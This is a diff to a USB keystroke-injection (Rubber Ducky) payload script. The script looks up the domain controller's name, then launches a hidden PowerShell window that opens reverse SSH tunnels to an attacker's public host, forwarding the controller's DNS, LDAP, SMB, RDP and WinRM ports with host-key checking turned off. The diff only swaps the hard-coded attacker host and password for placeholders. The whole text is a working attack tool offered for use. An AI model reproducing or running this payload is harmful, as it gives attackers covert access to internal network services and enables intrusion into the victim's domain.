@@ -32,12 +32,12 @@ REM | In CMD prompt, use "%logonserver:~2%" to get plain DC server name.
 REM | In powershell, use "$env:LOGONSERVER.substring(2)", but must be variable substituted. Substitution is below
 STRING $D=$env:LOGONSERVER.substring(2)
 ENTER
-REM ~~ | Change the username@IP (at way end) to your attacking machine, on a public IP 
-STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:"$D":53 -R 10080:"$D":80 -R 10389:"$D":389 -R 10445:"$D":445 -R 13389:"$D":3389 -R 15985:"$D":5985 ducky@1.1.1.1
+REM ~~ | Change the username@IP to your attacking machine, on a public IP 
+STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:"$D":53 -R 10080:"$D":80 -R 10389:"$D":389 -R 10445:"$D":445 -R 13389:"$D":3389 -R 15985:"$D":5985 username@IP
 ENTER
 DELAY 2000
-REM ~~ | Change string below to the ssh user's password
-STRING S0meth1ng!
+REM ~~ | Change p@ssw0rd! below to the ssh user's password
+STRING p@ssw0rd!
 ENTER
 
 
